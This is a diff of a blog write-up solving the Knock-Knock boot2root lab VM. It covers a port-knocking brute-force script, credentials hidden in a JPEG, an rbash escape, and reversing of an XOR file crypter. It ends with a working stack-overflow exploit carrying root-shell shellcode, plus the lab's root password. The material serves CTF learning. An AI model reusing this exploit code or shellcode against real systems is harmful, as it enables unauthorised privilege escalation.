@@ -8,10 +8,9 @@ categories:
 comments: true
 date: 2014-10-14T09:14:26Z
 title: knock-knock who’s there?
-url: /2014/10/14/knock-knock-whos-there-solving-knock-knock/
 ---
 
-##introduction
+## introduction
 [Knock-Knock](http://vulnhub.com/series/knock-knock,53/) is a vulnerable boot2root VM by [@zer0w1re](https://twitter.com/zer0w1re) and sure as heck was packed with interesting twists and things to learn!
 
 I figured I'd just _have a quick look™_, and midnight that evening ended up with _root_ privileges :D
@@ -27,7 +26,7 @@ This is my experience 'knocking' on the door.
 
 > “Theodore wasn't open so I knocked”
 
-##getting started
+## getting started
 As always, the vm's files were downloaded and imported into VirtualBox. I fired up the vm and watched `arp` for any new entries. This presented the first hurdle. A ping scan showed no new IP's in the network range my VM's were in (192.168.56.0/24):
 
 ```bash
@@ -112,7 +111,7 @@ Service detection performed. Please report any incorrect results at http://nmap.
 Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
 ```
 
-##knock knock...
+## knock knock...
 `tcp/1337` was the only open port on the machine. I promptly connected to it to see what we have:
 
 ```bash
@@ -133,7 +132,7 @@ There are plenty of implementations of port knocking out there. My personal favo
 
 This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.
 
-##...whos there?
+## ...whos there?
 So with the `tcp/1337` service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using `nmap` to scan them:
 
 ```bash
@@ -170,7 +169,7 @@ Remembering that the sequence changed every time you connected to the `tcp/1337`
 
 Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.
 
-##22 and 80 too
+## 22 and 80 too
 The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the `tcp/1337` service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:
 
 ```bash
@@ -234,7 +233,7 @@ def clean_up_ports(raw_string):
 
 def main():
     print "[+] Getting sequence"
-    
+
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((destination, 1337))
@@ -254,7 +253,7 @@ def main():
     # Lets knock all of the possible combinations of the ports list
     for port_list in itertools.permutations(ports):
 
-        print "[+] Knocking with sequence: %s" % (port_list,) 
+        print "[+] Knocking with sequence: %s" % (port_list,)
         for port in port_list:
             print "[+] Knocking on port %s:%s" % (destination,port)
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -263,7 +262,7 @@ def main():
             sock.close()
 
         print "[+] Finished sequence knock\n"
-    
+
 if __name__ == '__main__':
     print "[+] Knock knock opener"
     main()
@@ -275,10 +274,10 @@ Running this opened the ports every go :)
 
 I know that I could test to see if say `tcp/22` was open, but I went with the assumption that you don't know what the actual ports are that should be opened, and hence the complete run of all of the permutations.
 
-##may I burn the door now?
+## may I burn the door now?
 So, focus shifted to the web server at `tcp/80`. Browsing to the web server presented us with the following:
 
-{% img https://i.imgur.com/5NdJ65y.png %}
+{{< figure src="/images/knock_knock_web.png" >}}
 
 Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like `wfuzz` etc. With the hint _Gotta look harder_, I decided to move my attention to the door image itself.
 
@@ -290,7 +289,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 84741 (83K) [image/jpeg]
 Saving to: `knockknock.jpg'
 
-100%[============>] 84,741      68.2K/s   in 1.2s    
+100%[============>] 84,741      68.2K/s   in 1.2s
 
 2014-10-14 13:04:35 (68.2 KB/s) - `knockknock.jpg' saved [84741/84741]
 ```
@@ -300,7 +299,7 @@ I will admit that I was not very keen on the idea that something may be stego'd 
 Next, I ran the image through exiftool:
 
 ```bash
-root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg 
+root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
 ExifTool Version Number         : 8.60
 File Name                       : knockknock.jpg
 Directory                       : .
@@ -338,22 +337,22 @@ My idea was to try and recover the jpeg data from `knockknock.jpg` using `recove
 
 ```bash
 # extract the jpeg data
-root@kali:~# recoverjpeg knockknock.jpg 
+root@kali:~# recoverjpeg knockknock.jpg
 Restored 1 picture
 
 # the output image from the extract
-root@kali:~# ls image00000.jpg 
+root@kali:~# ls image00000.jpg
 image00000.jpg
 
 # the cmp
-root@kali:~# cmp image00000.jpg knockknock.jpg 
+root@kali:~# cmp image00000.jpg knockknock.jpg
 cmp: EOF on image00000.jpg
 ```
 
 So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:
 
 ```bash
-root@kali:~# tail -n 1 image00000.jpg 
+root@kali:~# tail -n 1 image00000.jpg
 9��<V ��v�ܫQqRJ5U�<��W�V9`��5BV(��<�t�WS�����1h
                                                          ��\���z$���vB��
 ```
@@ -361,7 +360,7 @@ root@kali:~# tail -n 1 image00000.jpg
 As expected, junk :P Lets look at `knockknock.jpeg`:
 
 ```bash
-root@kali:~# tail -n 4 knockknock.jpg 
+root@kali:~# tail -n 4 knockknock.jpg
 ⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�<�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
 Login Credentials
 abfnW
@@ -370,7 +369,7 @@ sax2Cw9Ow
 
 Hah! Login Credentials sound very promising!! :)
 
-##ceasar opens the door
+## ceasar opens the door
 After finding the hidden strings in the jpeg, I came to a quick realization that `abfnW:sax2Cw9Ow` was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.
 
 I tried to browse to the paths in the web server such as `abfnW/` and `sax2Cw9Ow/`, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.
@@ -405,7 +404,7 @@ So to get our first shell:
 
 ```bash
 root@kali:~/Desktop/knock-knock# ssh jason@192.168.56.203
-jason@192.168.56.203's password: 
+jason@192.168.56.203's password:
 
 Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686
 
@@ -420,7 +419,7 @@ Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
 jason@knockknock:~$
 ```
 
-##no rbash, just no
+## no rbash, just no
 Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:
 
 ```bash
@@ -429,7 +428,7 @@ jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
 ```
 Rbash? Oh well thats ok. I checked by inspecting the env var for `SHELL` which was `/bin/rbash` just to confirm. Thanks to having recently met a similar situation during the [Persistence](https://leonjza.github.io/blog/2014/09/18/from-persistence/) boot2root and learning new ways of breaking out of `rbash`, I just typed `nice /bin/bash`, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full `bash` shell.
 
-##tiny file crypter
+## tiny file crypter
 Some quick initial enumeration did not reveal anything particularly interesting. In `jason`'s home folder though was a file called `tfc`:
 
 ```bash
@@ -445,12 +444,12 @@ lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -> /dev/null
 -rw------- 1 jason jason 2.4K Oct 11 18:42 .viminfo
 
 jason@knockknock:~$ ./tfc
-_______________________________  
-\__    ___/\_   _____/\_   ___ \ 
-  |    |    |    __)  /    \  \/ 
+_______________________________
+\__    ___/\_   _____/\_   ___ \
+  |    |    |    __)  /    \  \/
   |    |    |     \   \     \____
   |____|    \___  /    \______  /
-                \/            \/ 
+                \/            \/
 
     Tiny File Crypter - 1.0
 
@@ -466,7 +465,7 @@ A sample encryption run can be seen as:
 
 ```bash
 # we have a source document
-jason@knockknock:~$ cat test.tfc 
+jason@knockknock:~$ cat test.tfc
 This is a test document.
 
 # we run the encryption program over it
@@ -475,12 +474,12 @@ jason@knockknock:~$ ./tfc test.tfc crypt.tfc
 
 # dump the encrypted file as hex. from the ascii we
 # can see its no longer human readable
-jason@knockknock:~$ xxd crypt.tfc 
+jason@knockknock:~$ xxd crypt.tfc
 0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.<.."&..@^.jm
 0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j
 
 # the resulting file is owned by root
-jason@knockknock:~$ ls -l crypt.tfc 
+jason@knockknock:~$ ls -l crypt.tfc
 -rw-r--r-- 1 root jason 25 Oct 14 08:12 crypt.tfc
 ```
 
@@ -490,7 +489,7 @@ Now, there is one very important finding. We can reverse the encrypted file by s
 jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc
 >> File crypted, goodbye!
 
-jason@knockknock:~$ cat reversed.tfc 
+jason@knockknock:~$ cat reversed.tfc
 This is a test document.
 ```
 
@@ -498,7 +497,7 @@ After finding this, quite a few ideas pop into ones head. Most notably, the fact
 
 But ok. That actually means nothing now. It also definitely does not tell us how to break `tfc` either!
 
-##fuzzing & disassembling tfc
+## fuzzing & disassembling tfc
 With all of the information gathered thus far about `tfc`, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override `/etc/shadow` to replace `root`s password, or replace `/root/.ssh/authorized_keys` with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the `.tfc` extension.
 
 By now it became very apparent that we have to bring `tfc` under the microscope and have a closer look at what is happening inside. The first step was to run `tfc` through `strings` and check the output:
@@ -518,12 +517,12 @@ Usage: ./tfc <filein.tfc> <fileout.tfc>
 >> Failed to create the output file
 >> File crypted, goodbye!
 ;*2$"
-_______________________________  
-\__    ___/\_   _____/\_   ___ \ 
-  |    |    |    __)  /    \  \/ 
+_______________________________
+\__    ___/\_   _____/\_   ___ \
+  |    |    |    __)  /    \  \/
   |    |    |     \   \     \____
   |____|    \___  /    \______  /
-                \/            \/ 
+                \/            \/
 ```
 
 As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D
@@ -545,8 +544,8 @@ Dump of assembler code for function main:
    0x08048956 <+50>:    test   eax,eax
 
    [... snip ...]
-   
-   0x0804896c <+72>:    ret    
+
+   0x0804896c <+72>:    ret
 End of assembler dump.
 gdb-peda$
 ```
@@ -560,18 +559,18 @@ Dump of assembler code for function cryptFile:
    0x080486e7 <+1>: mov    ebp,esp
    0x080486e9 <+3>: sub    esp,0x1088
 
-   [... snip ...] 
+   [... snip ...]
 
    0x080488a8 <+450>:   mov    DWORD PTR [esp],eax
    0x080488ab <+453>:   call   0x8048618 <xcrypt>       #<---
    0x080488b0 <+458>:   mov    eax,DWORD PTR [ebp-0x14]
-   
+
    [... snip ...]
 
-   0x08048922 <+572>:   leave  
-   0x08048923 <+573>:   ret    
+   0x08048922 <+572>:   leave
+   0x08048923 <+573>:   ret
 End of assembler dump.
-gdb-peda$ 
+gdb-peda$
 ```
 
 `crytFile` does some internal _things_ (like `call   0x80484a0 <open@plt>` opening the file?) and eventually calls a function `xcrypt`. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of `xor` calls it had. Of course, this is only a guess and I may have missed something else completely.
@@ -589,7 +588,7 @@ RELRO     : disabled
 
 Woa. **No** security? Ok...
 
-##we knocked and tfc opened the door to bof
+## we knocked and tfc opened the door to bof
 The disassembly of `tfc` did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)
 
 So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:
@@ -602,11 +601,11 @@ root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
 2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s
 
 # confirm the size of the file
-root@kali:~# ls -lh large.tfc 
+root@kali:~# ls -lh large.tfc
 -rw-r--r-- 1 root root 2.0M Oct 14 15:01 large.tfc
 
 # check how many characters we have in the file
-root@kali:~# wc -c large.tfc 
+root@kali:~# wc -c large.tfc
 2097152 large.tfc
 
 # attempt encryption
@@ -629,13 +628,13 @@ gdb-peda$ r gdb-test.tfc gdb-test-out.tfc
 
 Program received signal SIGSEGV, Segmentation fault.
 [----------------------------------registers-----------------------------------]
-EAX: 0x0 
-EBX: 0xb7fbfff4 --> 0x14bd7c 
-ECX: 0xffffffc8 
+EAX: 0x0
+EBX: 0xb7fbfff4 --> 0x14bd7c
+ECX: 0xffffffc8
 EDX: 0x9 ('\t')
-ESI: 0x0 
-EDI: 0x0 
-EBP: 0xc55193b 
+ESI: 0x0
+EDI: 0x0
+EBP: 0xc55193b
 ESP: 0xbffff3c0 ("_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;<\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\"\030}x\367\177\320&e:\202\030)\316\337/<\371\237\\pC\237\071+)\215JLN,f\352&\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"...)
 EIP: 0x675c916
 EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
@@ -643,13 +642,13 @@ EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow
 Invalid $PC address: 0x675c916
 [------------------------------------stack-------------------------------------]
 0000| 0xbffff3c0 ("_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;<\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\"\030}x\367\177\320&e:\202\030)\316\337/<\371\237\\pC\237\071+)\215JLN,f\352&\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"...)
-0004| 0xbffff3c4 --> 0x5e43a802 
-0008| 0xbffff3c8 --> 0x3d9cc67a 
-0012| 0xbffff3cc --> 0x4050608c 
+0004| 0xbffff3c4 --> 0x5e43a802
+0008| 0xbffff3c8 --> 0x3d9cc67a
+0012| 0xbffff3cc --> 0x4050608c
 0016| 0xbffff3d0 ("JH\\/Ux7;<\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\"\030}x\367\177\320&e:\202\030)\316\337/<\371\237\\pC\237\071+)\215JLN,f\352&\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\"l\311+\203˃&\322t\217 "...)
 0020| 0xbffff3d4 ("Ux7;<\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\"\030}x\367\177\320&e:\202\030)\316\337/<\371\237\\pC\237\071+)\215JLN,f\352&\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\"l\311+\203˃&\322t\217 BG\202\006"...)
-0024| 0xbffff3d8 --> 0x5489a33c 
-0028| 0xbffff3dc --> 0x3997552a 
+0024| 0xbffff3d8 --> 0x5489a33c
+0028| 0xbffff3dc --> 0x3997552a
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
@@ -659,7 +658,7 @@ gdb-peda$
 
 Ow. Ok, so we don't crash with a clean _0x41414141_ as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.
 
-##planning a exploit
+## planning a exploit
 So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs **after** the encryption function (remember `xcrypt`?) has run and wants to write the output to file (this is an assumption though).
 
 Ok. So. Make sure you focus now :)
@@ -670,18 +669,18 @@ So what does this leave us with? If we can reproduce the encryption logic in a w
 
 Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in `xcrypt()` to get started. Something I have practically 0 experience in.
 
-##reversing xcrypt()
+## reversing xcrypt()
 _For this part, I have to give a **big** high five to [@recrudesce](https://twitter.com/recrudesce) for helping me understand parts of the pseudo code._
 
 Right. Essentially, in order for us to better understand what exactly is happening within `xcrypt()`, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its _reaaaaaly_ hard to comprehend), but it _really_ helps in getting the mind to understand the flow.
 
 For the pseudo code, I downloaded a demo version of [Hopper](http://www.hopperapp.com/). The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded `tfc`, located the `xcrypt()` function and slapped the Pseudo code generation button:
 
-{% img https://i.imgur.com/VPUDXvo.png %}
+{{< figure src="/images/knock_knock_hopper_pseudo.png" >}}
 
 While looking around for pseudo code generation options, I came across the [Retargetable Decompiler](http://decompiler.fit.vutbr.cz/decompilation/) online service, which had the following image as a control flow graph for the calls in `xcrypt()`.
 
-{% img https://i.imgur.com/cT7i3ob.png %}
+{{< figure src="/images/knock_knock_crypter_control_flow.png" >}}
 
 Armed this this graph and the pseudo code, I was ready to start writing a python version of it.
 
@@ -715,19 +714,18 @@ Once inside the loop (and this is the part that for me was the hardest!!!) we se
 So what can we deduce then? The hardcoded base encryption key for `tfc` is `0xea1ab19f`. Cool eh! But ok lets move on.
 
 ```c
-            var_8 = 0x0;
-            while (var_8 <= 0x7) {
-                    if ((var_C & 0x1) != 0x0) {
-                            var_C = var_C >> 0x1;
-                            var_C = var_C ^ 0x6daa1cf4;
-                    }
-                    else {
-                            var_C = var_C >> 0x1;
-                    }
-                    var_8 = var_8 + 0x1;
-            }
-            var_4 = var_4 + 0x1;
-    }
+var_8 = 0x0;
+while (var_8 <= 0x7) {
+        if ((var_C & 0x1) != 0x0) {
+                var_C = var_C >> 0x1;
+                var_C = var_C ^ 0x6daa1cf4;
+        }
+        else {
+                var_C = var_C >> 0x1;
+        }
+        var_8 = var_8 + 0x1;
+}
+var_4 = var_4 + 0x1;
 ```
 
 Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from `while (0x0 <= 0x7) {`.
@@ -743,18 +741,17 @@ Up to here, I had my python script pretty much nailed as I was able to replicate
 That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don't know :( Maybe someone else can explain this :D I just ignored it :)
 
 ```c
-    var_14 = arg_4 & 0xfffffffc;
-    var_4 = 0x0;
-    while ((arg_4 & 0x3) > var_4) {
-            *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) & 0xff);
-            var_C = var_C >> 0x8;
-            var_4 = var_4 + 0x1;
-    }
-    return 0x0;
+var_14 = arg_4 & 0xfffffffc;
+var_4 = 0x0;
+while ((arg_4 & 0x3) > var_4) {
+        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) & 0xff);
+        var_C = var_C >> 0x8;
+        var_4 = var_4 + 0x1;
 }
+return 0x0;
 ```
 
-##the encryption logic replicated
+## the encryption logic replicated
 While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:
 
 ```python
@@ -817,7 +814,7 @@ def xcrypt(content, length):
         # append the 4 encrypted bytes by packing them
         encrypted += struct.pack('<L',encrypted_bytes)
 
-        # next we run the key mutation 
+        # next we run the key mutation
         for mutation in xrange(8):
 
             # no mutation is possible of the key is 1111 1111 1111 1111
@@ -825,7 +822,7 @@ def xcrypt(content, length):
                 key = key >> 1
                 key = key ^ 0x6daa1cf4
             else:
-                key = key >> 1  
+                key = key >> 1
 
     return encrypted;
 
@@ -840,26 +837,26 @@ if __name__ == '__main__':
 
 ```
 
-##testing the script
+## testing the script
 With the script done I obviously had to test it. I have a buffer of 1000 _A_'s as the content and redirected the script output to a file:
 
 ```bash
 root@kali:~# python make-crypt.py > test.tfc
 
-root@kali:~# head test.tfc 
+root@kali:~# head test.tfc
 ��[�]��C��dl�
               H)�Aotg�\!�E?�̀l+�B��$f5%�&�y�|S[I;R.�+T��w�$͟�7��?i�w'�3�s<A��^��
 
 root@kali:~# ./tfc test.tfc out.tfc
 >> File crypted, goodbye!
 
-root@kali:~# head out.tfc 
+root@kali:~# head out.tfc
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 So to recap. We generated a file `test.tfc`, which is the encrypted version of 1000 _A_'s. We then ran it through `tfc` which decrypted it to our cleartext _A_'s again.
 
-##finding EIP
+## finding EIP
 With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of `41`'s to work with in a debugger. So the next run, I changed the content to 6000 _A_'s, and ran it through `gdb` to be able to inspect the Segmentation Fault that occurs.
 
 ```bash
@@ -872,12 +869,12 @@ gdb-peda$ r crash.tfc crash-out.tfc
 
 Program received signal SIGSEGV, Segmentation fault.
 [----------------------------------registers-----------------------------------]
-EAX: 0x0 
-EBX: 0xb7fbfff4 --> 0x14bd7c 
-ECX: 0xffffffc8 
+EAX: 0x0
+EBX: 0xb7fbfff4 --> 0x14bd7c
+ECX: 0xffffffc8
 EDX: 0x9 ('\t')
-ESI: 0x0 
-EDI: 0x0 
+ESI: 0x0
+EDI: 0x0
 EBP: 0x41414141 ('AAAA')
 ESP: 0xbffff3d0 ('A' <repeats 200 times>...)
 EIP: 0x41414141 ('AAAA')
@@ -931,10 +928,10 @@ content = "A" *4124 + "BBBB" + "C"*(6000-4124-4)
 
 This resulted in a crash at `0x42424242` in `gdb` which was perfect!
 
-##exploiting tfc
+## exploiting tfc
 The only thing that was left to do was to find a `JMP ESP` instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with `NO NX`, it should happily execute code on it.
 
-{% img https://i.imgur.com/Mqkfe8l.png %}
+{{< figure src="/images/knock_knock_jmp_esp.png" >}}
 
 Using Evans Debugger (run with `edb --run ./tfc`), I searched for a _JMP ESP_ instruction and found one in `tfc` itself at `0x08048e93`. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:
 
@@ -952,7 +949,7 @@ if __name__ == '__main__':
         "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
         "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
     )
-    
+
     content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
     length = len(content)
 
@@ -974,12 +971,12 @@ As proof, the flag:
 
 ```bash
 # cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt
- __                         __              __                         __      ____ 
+ __                         __              __                         __      ____
 |  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
 |  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
 |    <|   |  (  <_> )  \___|    <  /_____/ |    <|   |  (  <_> )  \___|    <   |   |
 |__|_ \___|  /\____/ \___  >__|_ \         |__|_ \___|  /\____/ \___  >__|_ \  |___|
-     \/    \/            \/     \/              \/    \/            \/     \/       
+     \/    \/            \/     \/              \/    \/            \/     \/
 
 Hooray you got the flag!
 
@@ -995,5 +992,5 @@ root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, righ
 
 There are a number other goodies in /root to check out so be sure to do that!
 
-##conclusion
+## conclusion
 Big shoutout to [@zer0w1re](https://twitter.com/zer0w1re) for the VM and as always [@VulnHub](https://twitter.com/vulnhub) for the hosting. The learning experience has been invaluable! :)
